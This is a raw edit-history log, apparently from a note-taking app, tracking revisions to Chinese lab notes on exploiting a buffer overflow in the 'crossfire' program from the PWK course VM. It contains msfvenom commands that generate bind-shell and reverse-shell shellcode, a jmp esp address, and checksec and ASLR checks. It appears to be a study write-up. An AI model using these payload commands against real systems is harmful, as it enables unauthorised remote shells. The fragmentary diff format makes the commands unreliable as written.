debug"]],[319,319],[327,327]]],[1580822030202,["whale@Whale",[[1,328,"\n"]],[327,327],[328,328]]],[1580822042079,["whale@Whale",[[1,400,"![2]($res/2.PNG)\n\n"]],[328,328],[417,417]]],[1580822048155,["whale@Whale",[[-1,400,"![2]($res/2.PNG)\n\n"]],[400,418],[400,400]]],[1580822050640,["whale@Whale",[[1,318,"![2]($res/2.PNG)\n\n"]],[318,318],[336,336]]],[1580822058682,["whale@Whale",[[-1,1460,"\n"]],[1460,1460],[1459,1459]]],[1580822153928,["whale@Whale",[[-1,0,"缓冲区溢出（四）\n==="]],[0,12],[0,0]]],[1580822156283,["whale@Whale",[[1,0,"ca"]],[0,0],[2,2]]],[1580822156790,["whale@Whale",[[-1,0,"ca"]],[2,2],[0,0]]],[1580822161288,["whale@Whale",[[1,0,"参考资料：[https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)"]],[0,0],[269,269]]],[1580822162855,["whale@Whale",[[1,270,"\n"]],[269,269],[270,270]]],[1580822163064,["whale@Whale",[[1,271,"\n"]],[270,270],[271,271]]],[1580822195367,["whale@Whale",[[-1,6,"https://introspelliam.github.io/2017/09/30/"],[1,49,"## "],[-1,54,"%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"],[1,136,"程序的常用保护机制"]],[6,136],[23,23]]],[1580822199151,["whale@Whale",[[-1,6,"## "]],[9,9],[6,6]]],[1580822211634,["whale@Whale",[[-1,274,"只能在linux 32位"]],[274,286],[274,274]]],[1580822214804,["whale@Whale",[[1,274,"还是没有"]],[274,274],[278,278]]],[1580822277734,["whale@Whale",[[-1,453,"![2]($res/2.PNG)"]],[453,469],[453,453]]],[1580822279867,["whale@Whale",[[1,289,"![2]($res/2.PNG)"]],[289,289],[305,305]]],[1580822283199,["whale@Whale",[[1,306,"\n"]],[305,305],[306,306]]],[1580822283535,["whale@Whale",[[1,307,"\n"]],[306,306],[307,307]]],[1580822297420,["whale@Whale",[[1,307,"SIGSEGV就是非法内存访问异常"]],[307,307],[324,324]]],[1580822301545,["whale@Whale",[[-1,314,"就"]],[315,315],[314,314]]],[1580822370496,["whale@Whale",[[-1,489,"\n"]],[489,489],[488,488]]],[1580822421135,["whale@Whale",[[-1,1623,"0x08134597   jmp esp\n"]],[1623,1644],[1623,1623]]],[1580822422606,["whale@Whale",[[1,1624,"\n"]],[1623,1623],[1624,1624]]],[1580822423108,["whale@Whale",[[1,1624,"·"]],[1624,1624],[1625,1625]]],[1580822424047,["whale@Whale",[[-1,1624,"·"]],[1625,1625],[1624,1624]]],[1580822424919,["whale@Whale",[[1,1624,"```"]],[1624,1624],[1627,1627]]],[1580822426637,["whale@Whale",[[1,1678,"```"]],[1678,1678],[1681,1681]]],[1580822454399,["whale@Whale",[[-1,253,"经过一些失败的尝试，crossfire程序还是没有成功反弹shell。\n![2]($res/2.PNG)\n\nSIGSEGV是非法内存访问异常"]],[253,323],[253,253]]],[1580822460389,["whale@Whale",[[1,1632,"\n"]],[1631,1631],[1632,1632]]],[1580822462090,["whale@Whale",[[-1,1632,"\n"],[1,1633,"## 经过一些失败的尝试，crossfire程序还是没有成功反弹shell。\n![2]($res/2.PNG)\n\nSIGSEGV是非法内存访问异常"]],[1632,1632],[1705,1705]]],[1580822467196,["whale@Whale",[[1,1635,"\n"]],[1635,1635],[1636,1636]]],[1580822470383,["whale@Whale",[[1,1635,"debug"]],[1635,1635],[1640,1640]]],[1580822483237,["whale@Whale",[[-1,1613,"\n"]],[1613,1613],[1612,1612]]],[1580822483420,["whale@Whale",[[-1,1612,"\n"]],[1612,1612],[1611,1611]]],[1580822494813,["whale@Whale",[[-1,419,"## debug\n"]],[419,428],[419,419]]],[1580822495086,["whale@Whale",[[-1,419,"\n"]],[419,419],[418,418]]],[1580822506773,["whale@Whale",[[-1,254,"## 坏字符\n\n09得注意,fscanf遇到制表符(\\t，0x09)时会被截断\n\n重新测试坏字符\n`\\x90\\x0a\\x00`\n\nmsfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f python -b \"\\x00\\x09\\x0a\" –e x86/shikata_ga_nai\n"]],[254,417],[254,254]]],[1580822507693,["whale@Whale",[[-1,255,"\n"]],[254,254],[253,253]]],[1580822507916,["whale@Whale",[[-1,254,"\n"]],[253,253],[252,252]]],[1580822508821,["whale@Whale",[[-1,253,"\n"]],[252,252],[251,251]]],[1580822529508,["whale@Whale",[[-1,652,"msfvenom -p linux/x32/shell_bind_tcp LPORT=4444 -f c -b \"\\x00\\x09\\x0a\\x20\" –e x86/shikata_ga_nai"]],[652,748],[652,652]]],[1580822529940,["whale@Whale",[[-1,652,"\n"]],[652,652],[651,651]]],[1580822553716,["whale@Whale",[[-1,418,"bind_tcp LPORT=4444 EXITFUNC=thread -f python -b \"\\x00\\x09\\x0a\\x20\" –e x86/shikata_ga_nai\n\n\nmsfvenom -p linux/x86/shell_"]],[389,509],[389,389]]],[1580822553923,["whale@Whale",[[-1,389,"\n"]],[389,389],[388,388]]],[1580822554179,["whale@Whale",[[-1,388,"\n"]],[388,388],[387,387]]],[1580822554834,["whale@Whale",[[1,388,"\n"]],[387,387],[388,388]]],[1580822578946,["whale@Whale",[[1,1218,"\n"]],[1217,1217],[1218,1218]]],[1580822579510,["whale@Whale",[[1,1218,"z"]],[1218,1218],[1219,1219]]],[1580822580227,["whale@Whale",[[-1,1218,"z"]],[1219,1219],[1218,1218]]],[1580822584548,["whale@Whale",[[1,1218,"这是exp的"]],[1218,1218],[1224,1224]]],[1580822585310,["whale@Whale",[[-1,1223,"的"]],[1224,1224],[1223,1223]]],[1580822592918,["whale@Whale",[[1,1223,"在栈中的执行流程。"]],[1223,1223],[1232,1232]]],[1580822640043,["whale@Whale",[[1,1330,"\n\n"]],[1330,1330],[1331,1331]]],[1580822640243,["whale@Whale",[[1,1332,"\n"]],[1331,1331],[1332,1332]]],[1580822647552,["whale@Whale",[[1,1333,"![3]($res/3.PNG)\n\n"]],[1332,1332],[1350,1350]]],[1580822656967,["whale@Whale",[[1,1332,"### checksec"]],[1332,1332],[1344,1344]]],[1580822964382,["whale@Whale",[[1,1363,"\n"]],[1362,1362],[1363,1363]]],[1580822965405,["whale@Whale",[[1,1363,"RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE\r\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2262 Symbols     No     0               18      crossfire\r\nRELRO  read only relocation"]],[1363,1363],[1684,1684]]],[1580822973440,["whale@Whale",[[1,1363,"\n"],[-1,1508,"\r"],[-1,1655,"\r"]],[1362,1362],[1363,1363]]],[1580822974545,["whale@Whale",[[1,1363,"```"]],[1363,1363],[1366,1366]]],[1580822976926,["whale@Whale",[[1,1659,"\n"]],[1659,1659],[1660,1660]]],[1580822978467,["whale@Whale",[[1,1659,"```"]],[1659,1659],[1662,1662]]],[1580822992364,["whale@Whale",[[-1,1669," "]],[1669,1669],[1668,1668]]],[1580822993795,["whale@Whale",[[1,1668,":"]],[1668,1668],[1669,1669]]],[1580823831005,["whale@Whale",[[1,1691,"\n"]],[1690,1690],[1691,1691]]],[1580823831624,["whale@Whale",[[1,1691,"STACK CANARY "]],[1691,1691],[1704,1704]]],[1580823832984,["whale@Whale",[[1,1705,"\n"]],[1704,1704],[1705,1705]]],[1580823841452,["whale@Whale",[[1,1706,"\n"]],[1704,1704],[1705,1705]]],[1580823841884,["whale@Whale",[[1,1705,"NX"]],[1705,1705],[1707,1707]]],[1580823842500,["whale@Whale",[[1,1709,"\n"]],[1707,1707],[1708,1708]]],[1580823848607,["whale@Whale",[[1,1708,"PIE "]],[1708,1708],[1712,1712]]],[1580823889643,["whale@Whale",[[1,1714,"\n"]],[1712,1712],[1713,1713]]],[1580823890131,["whale@Whale",[[1,1713,"RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE"]],[1713,1713],[1794,1794]]],[1580823891338,["whale@Whale",[[1,1796,"\n"]],[1794,1794],[1795,1795]]],[1580826777905,["whale@Whale",[[1,1724,"\n"]],[1724,1724],[1725,1725]]],[1580826779489,["whale@Whale",[[1,1737,"\n"]],[1737,1737],[1738,1738]]],[1580826782659,["whale@Whale",[[-1,1738," "]],[1739,1739],[1738,1738]]],[1580826784480,["whale@Whale",[[1,1753,"\n"]],[1753,1753],[1754,1754]]],[1580826786809,["whale@Whale",[[1,1779,"\n"]],[1779,1779],[1780,1780]]],[1580826789882,["whale@Whale",[[-1,1754," "]],[1755,1755],[1754,1754]]],[1580826824064,["whale@Whale",[[1,1754," "]],[1754,1754],[1755,1755]]],[1580826826167,["whale@Whale",[[-1,1754," "]],[1755,1755],[1754,1754]]],[1580827707089,["whale@Whale",[[1,1704,"{"]],[1704,1704],[1705,1705]]],[1580827707885,["whale@Whale",[[-1,1704,"{"]],[1705,1705],[1704,1704]]],[1580827712960,["whale@Whale",[[1,1704,"：栈保护"]],[1704,1704],[1708,1708]]],[1580827802310,["whale@Whale",[[1,1782,"检查是否存在缓冲区溢出的错误"]],[1782,1782],[1796,1796]]],[1580827832705,["whale@Whale",[[1,1711," 将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令"]],[1711,1711],[1786,1786]]],[1580827927991,["whale@Whale",[[1,1791,"地址空间分布随机化"]],[1791,1791],[1800,1800]]],[1580828266512,["whale@Whale",[[1,1690," 尽量减少可写的存储区域"]],[1690,1690],[1702,1702]]],[1580828408687,["whale@Whale",[[-1,1820,"    "]],[1820,1824],[1820,1820]]],[1580828445847,["whale@Whale",[[-1,1908,"\n"]],[1908,1908],[0,0]]],[1580828446288,["whale@Whale",[[1,1908,"[https://images.offensive-security.com/pwk-kali-vm.7z](https://images.offensive-security.com/pwk-kali-vm.7z)"]],[0,0],[2016,2016]]],[1580828456262,["whale@Whale",[[-1,1909,"https://images.offensive-security.com/"]],[1909,1947],[1909,1909]]],[1580828466042,["whale@Whale",[[1,1909,"官方给的靶机地址{"]],[1909,1909],[1918,1918]]],[1580828466877,["whale@Whale",[[-1,1917,"{"]],[1918,1918],[1917,1917]]],[1580828469442,["whale@Whale",[[1,1917,": "]],[1917,1917],[1919,1919]]],[1580828687266,["whale@Whale",[[-1,155,"\n"]],[155,155],[154,154]]],[1580879938191,["whale@Whale",[[1,1987,"\n\n"]],[1987,1987],[1988,1988]]],[1580879938374,["whale@Whale",[[1,1989,"\n"]],[1988,1988],[1989,1989]]],[1580879945687,["whale@Whale",[[1,1990,"![4]($res/4.PNG)\n\n"]],[1989,1989],[2007,2007]]],[1580906476687,["whale@Whale",[[1,1007,"0"]],[1007,1007],[1008,1008]]],[1580906508947,["whale@Whale",[[1,944,"l"]],[944,944],[945,945]]],[1580906509692,["whale@Whale",[[-1,944,"l"]],[945,945],[944,944]]],[1580906521635,["whale@Whale",[[1,944,"来查找跳转指令。"]],[944,944],[952,952]]],[1580906835697,["whale@Whale",[[1,1340,"\n"]],[1339,1339],[1340,1340]]],[1580906850124,["whale@Whale",[[1,1340,"同样的crossfire程序，同样的exp。在官方的"]],[1340,1340],[1366,1366]]],[1580907357140,["whale@Whale",[[1,1366,"给的虚拟机中可以成功反弹shell,"]],[1366,1366],[1384,1384]]],[1580907359836,["whale@Whale",[[-1,1376,"反弹shell,"]],[1384,1384],[1376,1376]]],[1580907360561,["whale@Whale",[[1,1376,"yi"]],[1376,1376],[1378,1378]]],[1580907361199,["whale@Whale",[[-1,1376,"yi"]],[1378,1378],[1376,1376]]],[1580907371749,["whale@Whale",[[1,1376,"溢出获得shell，但是在自己"]],[1376,1376],[1391,1391]]],[1580907374056,["whale@Whale",[[1,1391,"的64"]],[1391,1391],[1394,1394]]],[1580907374647,["whale@Whale",[[-1,1392,"64"]],[1394,1394],[1392,1392]]],[1580907378103,["whale@Whale",[[1,1392,"x64位置"]],[1392,1392],[1397,1397]]],[1580907378339,["whale@Whale",[[-1,1396,"置"]],[1397,1397],[1396,1396]]],[1580907385249,["whale@Whale",[[1,1396,"linux上不能成功"]],[1396,1396],[1406,1406]]],[1580907386604,["whale@Whale",[[-1,1404,"成功"]],[1406,1406],[1404,1404]]],[1580907390637,["whale@Whale",[[1,1404,"成功运行。"]],[1404,1404],[1409,1409]]],[1580907392497,["whale@Whale",[[-1,1404,"成功运行。"]],[1409,1409],[1404,1404]]],[1580907393987,["whale@Whale",[[1,1404,"成功"]],[1404,1404],[1406,1406]]],[1580907398307,["whale@Whale",[[-1,1404,"成功"]],[1406,1406],[1404,1404]]],[1580907398564,["whale@Whale",[[1,1404,"。"]],[1404,1404],[1405,1405]]],[1580907400266,["whale@Whale",[[1,1406,"\n"]],[1405,1405],[1406,1406]]],[1580907400818,["whale@Whale",[[1,1407,"\n"]],[1406,1406],[1407,1407]]],[1580907420662,["whale@Whale",[[-1,1984,"[官方给的靶机地址: pwk-kali-vm.7z](https://images.offensive-security.com/pwk-kali-vm.7z)\n\n\n![4]($res/4.PNG)\n"]],[1984,2084],[1984,1984]]],[1580907424616,["whale@Whale",[[1,1407,"[官方给的靶机地址: pwk-kali-vm.7z](https://images.offensive-security.com/pwk-kali-vm.7z)\n\n\n![4]($res/4.PNG)\n"]],[1407,1407],[1507,1507]]],[1580907426609,["whale@Whale",[[-1,1489,"\n"]],[1489,1489],[1488,1488]]],[1580907602601,["whale@Whale",[[1,1507,"\n"]],[1506,1506],[1507,1507]]],[1580907602816,["whale@Whale",[[1,1508,"\n"]],[1507,1507],[1508,1508]]],[1580907603093,["whale@Whale",[[1,1508,"[https://github.com/eteran/edb-debugger/issues/724](https://github.com/eteran/edb-debugger/issues/724)"]],[1508,1508],[1610,1610]]],[1580907612232,["whale@Whale",[[1,1507,"github上有人问了"]],[1507,1507],[1518,1518]]],[1580907617990,["whale@Whale",[[1,1518,"同样的问题，但是没有解决"]],[1518,1518],[1530,1530]]],[1580907619867,["whale@Whale",[[-1,1528,"解决"]],[1530,1530],[1528,1528]]],[1580907621454,["whale@Whale",[[1,1528,"答案："]],[1528,1528],[1531,1531]]],[1580907622178,["whale@Whale",[[-1,1531,"\n"]],[1531,1531],[1531,1531]]],[1580907631561,["whale@Whale",[[1,1530,"活着"]],[1530,1530],[1532,1532]]],[1580907632011,["whale@Whale",[[-1,1530,"活着"]],[1532,1532],[1530,1530]]],[1580907635935,["whale@Whale",[[1,1530,"或者解决方案"]],[1530,1530],[1536,1536]]],[1580907651835,["whale@Whale",[[-1,1537,"[https://github.com/eteran/edb-debugger/issues/724"],[1,1587,"问题"]],[1537,1587],[1539,1539]]],[1580907654269,["whale@Whale",[[1,1537,"【"]],[1537,1537],[1538,1538]]],[1580907655152,["whale@Whale",[[-1,1537,"【"]],[1538,1538],[1537,1537]]],[1580907656281,["whale@Whale",[[1,1537,"["]],[1537,1537],[1538,1538]]],[1580907659572,["whale@Whale",[[-1,1537,"[问题](https://github.com/eteran/edb-debugger/issues/724)"]],[1537,1592],[1537,1537]]],[1580907662262,["whale@Whale",[[1,1521,"["],[1,1523,"](https://github.com/eteran/edb-debugger/issues/724)"]],[1521,1523],[1576,1576]]],[1580907665296,["whale@Whale",[[-1,1589,"："]],[1590,1590],[1589,1589]]],[1580907665982,["whale@Whale",[[1,1590,"\n"]],[1589,1589],[1590,1590]]],[1580907666502,["whale@Whale",[[1,1591,"\n"]],[1590,1590],[1591,1591]]],[1580907738182,["whale@Whale",[[-1,1919,"```"]],[1919,1922],[1919,1919]]],[1580907740398,["whale@Whale",[[1,2166,"\n"]],[2163,2163],[2164,2164]]],[1580907740872,["whale@Whale",[[1,2164,"```"]],[2164,2164],[2167,2167]]],[1580907873300,["whale@Whale",[[1,2170,"\n"]],[2167,2167],[2168,2168]]],[1580907874166,["whale@Whale",[[1,2168,"Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux\r\n"]],[2168,2168],[2256,2256]]],[1580907876011,["whale@Whale",[[1,2168,"\n"],[-1,2254,"\r"]],[2167,2167],[2168,2168]]],[1580907907250,["whale@Whale",[[1,2169,"\n"]],[2168,2168],[2169,2169]]],[1580907908502,["whale@Whale",[[1,2169,"## "]],[2169,2169],[2172,2172]]],[1580907914902,["whale@Whale",[[1,2172,"xu"]],[2172,2172],[2174,2174]]],[1580907915397,["whale@Whale",[[-1,2172,"xu"]],[2174,2174],[2172,2172]]],[1580907924656,["whale@Whale",[[1,2172,"运行crossfire的虚拟机"]],[2172,2172],[2187,2187]]],[1580907924922,["whale@Whale",[[1,2188,"\n"]],[2187,2187],[2188,2188]]],[1580907928453,["whale@Whale",[[1,2188,"w"]],[2188,2188],[2189,2189]]],[1580907928899,["whale@Whale",[[-1,2188,"w"]],[2189,2189],[2188,2188]]],[1580907931578,["whale@Whale",[[1,2188,"未成功的："]],[2188,2188],[2193,2193]]],[1580907935644,["whale@Whale",[[1,2282,"成功的："]],[2282,2282],[2286,2286]]],[1580907956594,["whale@Whale",[[1,2194,"·"]],[2194,2194],[2195,2195]]],[1580907957774,["whale@Whale",[[-1,2194,"·"]],[2195,2195],[2194,2194]]],[1580907958295,["whale@Whale",[[1,2194,"`"]],[2194,2194],[2195,2195]]],[1580907959811,["whale@Whale",[[1,2281,"`"]],[2281,2281],[2282,2282]]],[1580907994389,["whale@Whale",[[1,2284,"![5]($res/5.PNG)\n\n"]],[2289,2289],[2301,2301]]],[1580907998339,["whale@Whale",[[-1,2284,"![5]($res/5.PNG)\n"]],[2284,2301],[2284,2284]]],[1580908000076,["whale@Whale",[[1,2290,"![5]($res/5.PNG)\n"]],[2290,2290],[2307,2307]]],[1580908003036,["whale@Whale",[[-1,2284,"\n"]],[2284,2284],[2283,2283]]],[1580908009917,["whale@Whale",[[-1,1591,"\n"]],[1591,1591],[1590,1590]]],[1580908102785,["whale@Whale",[[1,2306,"\n"]],[2305,2305],[2306,2306]]],[1580908107540,["whale@Whale",[[-1,2306,"\n"],[1,2307,"ba"]],[2306,2306],[2308,2308]]],[1580908108136,["whale@Whale",[[-1,2306,"ba"]],[2308,2308],[2306,2306]]],[1580908108518,["whale@Whale",[[-1,2305,"\n"],[1,2306,"b"]],[2306,2306],[2305,2306]]],[1580908108612,["whale@Whale",[[1,2306,"a"]],[2305,2306],[2305,2307]]],[1580908109101,["whale@Whale",[[-1,2306,"a"]],[2305,2307],[2305,2306]]],[1580908109296,["whale@Whale",[[-1,2305,"b"]],[2305,2306],[0,0]]],[1580908109906,["whale@Whale",[[1,2305,"\n\n"]],[2305,2305],[2306,2306]]],[1580908116156,["whale@Whale",[[-1,2306,"\n"],[1,2307,"把第二条"]],[2306,2306],[2310,2310]]],[1580908116679,["whale@Whale",[[-1,2309,"条"]],[2310,2310],[2309,2309]]],[1580908124149,["whale@Whale",[[1,2309,"台成功的机器 "]],[2309,2309],[2316,2316]]],[1580908126060,["whale@Whale",[[-1,2315," "]],[2316,2316],[2315,2315]]],[1580908133182,["whale@Whale",[[1,2315,"叫做A吧"]],[2315,2315],[2319,2319]]],[1580908134448,["whale@Whale",[[-1,2317,"A吧"]],[2319,2319],[2317,2317]]],[1580908135920,["whale@Whale",[[1,2317,"B,"]],[2317,2317],[2319,2319]]],[1580908136665,["whale@Whale",[[-1,2318,","]],[2319,2319],[2318,2318]]],[1580908142753,["whale@Whale",[[-1,2307,"第二台"]],[2310,2310],[2307,2307]]],[1580908143592,["whale@Whale",[[1,2307,"w"]],[2307,2307],[2308,2308]]],[1580908144089,["whale@Whale",[[-1,2307,"w"]],[2308,2308],[2307,2307]]],[1580908150653,["whale@Whale",[[1,2191,"机器A"]],[2191,2191],[2194,2194]]],[1580908153249,["whale@Whale",[[1,2289,"j"]],[2289,2289],[2290,2290]]],[1580908153804,["whale@Whale",[[-1,2289,"j"]],[2290,2290],[2289,2289]]],[1580908157682,["whale@Whale",[[1,2289,"虚拟机B"]],[2289,2289],[2293,2293]]],[1580908160129,["whale@Whale",[[-1,2313,"把成功的机器叫做B"]],[2313,2322],[2313,2313]]],[1580908160913,["whale@Whale",[[1,2313,"\n\n"]],[2313,2313],[2314,2314]]],[1580908161867,["whale@Whale",[[-1,2314,"\n"]],[2314,2314],[2313,2313]]],[1580908164936,["whale@Whale",[[-1,2313,"\n"],[1,2314,"Bji"]],[2313,2313],[2316,2316]]],[1580908165447,["whale@Whale",[[-1,2314,"ji"]],[2316,2316],[2314,2314]]],[1580908165947,["whale@Whale",[[1,2314,"Jiq"]],[2314,2314],[2317,2317]]],[1580908166710,["whale@Whale",[[-1,2314,"Jiq"]],[2317,2317],[2314,2314]]],[1580908169650,["whale@Whale",[[1,2314,"机器见擦汗"]],[2314,2314],[2319,2319]]],[1580908170382,["whale@Whale",[[-1,2316,"见擦汗"]],[2319,2319],[2316,2316]]],[1580908173385,["whale@Whale",[[1,2316,"检查![5]($res/5.PNG)\n"]],[2316,2316],[2335,2335]]],[1580908175952,["whale@Whale",[[-1,2316,"检查![5]($res/5.PNG)\n"]],[2335,2335],[2316,2316]]],[1580908188157,["whale@Whale",[[1,2316,"检查```\n/proc/sys/kernel/randomize_va_space\n```"]],[2316,2316],[2361,2361]]],[1580908190952,["whale@Whale",[[1,2318,"\n"]],[2318,2318],[2319,2319]]],[1580908193953,["whale@Whale",[[1,2359,"\n"]],[2358,2358],[2359,2359]]],[1580908194838,["whale@Whale",[[1,2359,"2"]],[2359,2359],[2360,2360]]],[1580908208111,["whale@Whale",[[1,2318,"“”"]],[2318,2318],[2320,2320]]],[1580908209245,["whale@Whale",[[1,2319,"地址空间分布随机化"]],[2319,2319],[2328,2328]]],[1580908212873,["whale@Whale",[[1,2329,"，后"]],[2329,2329],[2331,2331]]],[1580908213876,["whale@Whale",[[1,2331,"发现"]],[2331,2331],[2333,2333]]],[1580908214979,["whale@Whale",[[-1,2329,"，后发现"]],[2333,2333],[2329,2329]]],[1580908235072,["whale@Whale",[[1,2329,"后，发现是开启状态，可以确定运行失败的原因跟这个无关。"]],[2329,2329],[2356,2356]]],[1580908484597,["whale@Whale",[[-1,1015,"0"]],[1016,1016],[1015,1015]]],[1580908591037,["whale@Whale",[[1,968,"\n"]],[967,967],[968,968]]],[1580908597759,["whale@Whale",[[1,968,"如果运行msfelfscant"]],[968,968],[983,983]]],[1580908598245,["whale@Whale",[[-1,982,"t"]],[983,983],[982,982]]],[1580908603702,["whale@Whale",[[1,982,"提示命令未找到'c"]],[982,982],[991,991]]],[1580908605122,["whale@Whale",[[-1,989,"'c"]],[991,991],[989,989]]],[1580908605548,["whale@Whale",[[1,989,"“"]],[989,989],[990,990]]],[1580908611312,["whale@Whale",[[1,990," command not found” "]],[990,990],[1010,1010]]],[1580908640363,["whale@Whale",[[1,1011,"\n"]],[1010,1010],[1011,1011]]],[1580908640628,["whale@Whale",[[1,1012,"\n"]],[1011,1011],[1012,1012]]],[1580908643535,["whale@Whale",[[1,1011,"    **cd /usr/bin**\n**    ln -s /usr/share/framework2/msfelfscan msfelfscan**"]],[1011,1011],[1088,1088]]],[1580908740673,["whale@Whale",[[-1,1011,"    "],[1,1015,"\n    "],[-1,1033,"   "],[1,1036,"   ·"]],[1010,1010],[1012,1012]]],[1580908741612,["whale@Whale",[[-1,1011,"·"]],[1012,1012],[1011,1011]]],[1580908742608,["whale@Whale",[[1,1011,"```"]],[1011,1011],[1014,1014]]],[1580908744888,["whale@Whale",[[1,1093,"```"]],[1093,1093],[1096,1096]]],[1580908745890,["whale@Whale",[[1,1097,"\n"]],[1096,1096],[1097,1097]]],[1580908749251,["whale@Whale",[[-1,1015,"    **"]],[1015,1015],[1015,1015]]],[1580908752794,["whale@Whale",[[1,1153,"\n"]],[1152,1152],[1153,1153]]],[1580908755659,["whale@Whale",[[-1,1092,"```"]],[1092,1092],[1092,1092]]],[1580908757342,["whale@Whale",[[1,1150,"```"]],[1150,1150],[1153,1153]]],[1580908760571,["whale@Whale",[[-1,1029,"** "]],[1032,1032],[1029,1029]]],[1580908760995,["whale@Whale",[[-1,1028,"\n"]],[1029,1029],[1028,1028]]],[1580908762338,["whale@Whale",[[1,1028,"\n"]],[1028,1028],[1029,1029]]],[1580908763529,["whale@Whale",[[-1,1029,"   "]],[1029,1029],[1029,1029]]],[1580908765962,["whale@Whale",[[-1,1025,"n**"]],[1028,1028],[1025,1025]]],[1580908767405,["whale@Whale",[[1,1025,"k"]],[1025,1025],[1026,1026]]],[1580908768402,["whale@Whale",[[-1,1025,"k"]],[1026,1026],[1025,1025]]],[1580908768984,["whale@Whale",[[1,1025,"n"]],[1025,1025],[1026,1026]]],[1580908770586,["whale@Whale",[[-1,1076,"**"]],[1078,1078],[1076,1076]]],[1580908772539,["whale@Whale",[[-1,1082,"\n"]],[1082,1082],[1081,1081]]],[1580908772835,["whale@Whale",[[-1,1081,"\n"]],[1081,1081],[1080,1080]]],[1580909510565,[null,[[-1,1014," "],[1,1015,"\nc"],[-1,1024,"n"]],[1014,1014],[1024,1024]]],[1580909510565,[null,[[1,1014," "],[-1,1014,"\nc"],[1,1025,"n"]],[1024,1024],[1014,1014]]],[1580909491278,["whale@Whale",[[-1,416,"reverse"],[1,423,"bind"],[-1,429,"HOST=192.168.67.1 L"],[-1,458,"EXITFUNC=thread "],[-1,477,"python -b "],[1,487,"c -b\r\n"],[-1,495,"9\\x0a"],[1,500,"a\\x0d"],[-1,506,"-"],[1,507,"–"],[-1,527," \n"]],[388,529],[485,485]]],[1580909503714,["whale@Whale",[[-1,443,"\r"],[-1,453,"a\\x0d"],[1,458,"9\\x0a"]],[445,461],[461,461]]],[1580909693595,[null,[[-1,969," "],[1,970,"\nc"],[-1,979,"n"]],[969,969],[979,979]]],[1580909693595,[null,[[1,969," "],[-1,969,"\nc"],[1,980,"n"]],[979,979],[969,969]]],[1580909665686,["whale@Whale",[[1,485,"\n"]],[484,484],[485,485]]],[1580909665886,["whale@Whale",[[1,486,"\n"]],[485,485],[486,486]]],[1580909670654,["whale@Whale",[[1,486,"msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b\n\"\\x00\\x09\\x0a\\x20\" –e x86/shikata_ga_nai"]],[486,486],[582,582]]],[1580909673312,["whale@Whale",[[-1,537,"c"]],[538,538],[537,537]]],[1580909675373,["whale@Whale",[[1,537,";j"]],[537,537],[539,539]]],[1580909676799,["whale@Whale",[[-1,537,";j"]],[539,539],[537,537]]],[1580909678328,["whale@Whale",[[1,537,"python"]],[537,537],[543,543]]],[1580909754546,[null,[[-1,1072," "],[1,1073,"\nc"],[-1,1082,"n"]],[1072,1072],[1082,1082]]],[1580909754546,[null,[[1,1072," "],[-1,1072,"\nc"],[1,1083,"n"]],[1082,1082],[1072,1072]]],[1580909701766,["whale@Whale",[[-1,546,"\n"]],[546,546],[546,546]]],[1580909703686,["whale@Whale",[[1,546," "]],[546,546],[547,547]]],[1580910241563,[null,[[-1,1072," "],[1,1073,"\nc"],[-1,1082,"n"]],[1072,1072],[1082,1082]]],[1580910241563,[null,[[1,1072," "],[-1,1072,"\nc"],[1,1083,"n"]],[1082,1082],[1072,1072]]],[1580910241175,["whale@Whale",[[1,2572,"\n\n"]],[2572,2572],[2573,2573]]],[1580910301589,[null,[[-1,1072," "],[1,1073,"\nc"],[-1,1082,"n"]],[1072,1072],[1082,1082]]],[1580910301589,[null,[[1,1072," "],[-1,1072,"\nc"],[1,1083,"n"]],[1082,1082],[1072,1072]]],[1580910248608,["whale@Whale",[[1,2567,"![6]($res/6.PNG)\n\n"]],[2573,2573],[2584,2584]]],[1580910256882,["whale@Whale",[[-1,2567,"![6]($res/6.PNG)\n"]],[2567,2584],[2567,2567]]],[1580910257688,["whale@Whale",[[-1,2567,"\n"]],[2567,2567],[2566,2566]]],[1580910258632,["whale@Whale",[[1,2574,"\n"]],[2572,2572],[2573,2573]]],[1580910259542,["whale@Whale",[[1,2573,"![6]($res/6.PNG)\n"]],[2573,2573],[2590,2590]]],[1580910264665,["whale@Whale",[[-1,2591,"\n"],[1,2592,"zai"]],[2591,2591],[2594,2594]]],[1580910265228,["whale@Whale",[[-1,2591,"zai"]],[2594,2594],[2591,2591]]],[1580910266051,["whale@Whale",[[-1,2590,"\n"],[1,2591,"z"]],[2591,2591],[2590,2591]]],[1580910266286,["whale@Whale",[[1,2591,"a"]],[2590,2591],[2590,2592]]],[1580910266388,["whale@Whale",[[1,2592,"i"]],[2590,2592],[2590,2593]]],[1580910266531,["whale@Whale",[[1,2593,"'c"]],[2590,2593],[2590,2595]]],[1580910266629,["whale@Whale",[[1,2595,"i"]],[2590,2595],[2590,2596]]],[1580910267444,["whale@Whale",[[-1,2590,"zai'ci"],[1,2596,"再次"]],[2590,2596],[2590,2592]]],[1580910270983,["whale@Whale",[[1,2592,"运行机器B,"]],[2592,2592],[2598,2598]]],[1580910271704,["whale@Whale",[[-1,2597,","]],[2598,2598],[2597,2597]]],[1580910280970,["whale@Whale",[[1,2597,"，溢出就无法成功了，可能"]],[2597,2597],[2609,2609]]],[1580910283275,["whale@Whale",[[-1,2607,"可能"]],[2609,2609],[2607,2607]]],[1580910289140,["whale@Whale",[[1,2607,"重启后，运行exp，"]],[2607,2607],[2617,2617]]],[1580910292408,["whale@Whale",[[-1,2606,"，"]],[2607,2607],[2606,2606]]],[1580910293188,["whale@Whale",[[1,2606,"。"]],[2606,2606],[2607,